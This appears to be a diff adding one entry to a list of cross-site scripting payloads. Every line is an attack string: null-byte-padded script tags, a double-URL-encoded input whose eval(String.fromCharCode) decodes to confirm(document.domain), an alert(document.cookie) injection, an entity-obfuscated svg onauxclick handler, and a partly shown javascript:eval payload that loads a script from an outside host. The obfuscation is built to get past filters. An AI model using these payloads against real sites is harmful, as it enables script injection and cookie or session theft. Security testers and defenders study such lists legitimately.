@@ -21,3 +21,4 @@ javascript:eval('var a=document.createElement('script');a.src='https://hunterxbx
 <script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
 "><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>
 %22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+"/><svg onauxclick=&#x63&#x6F&#x5C&#x75&#x30&#x30&#x36&#x65&#x66&#x69&#x72&#x6D(\\1\\)>
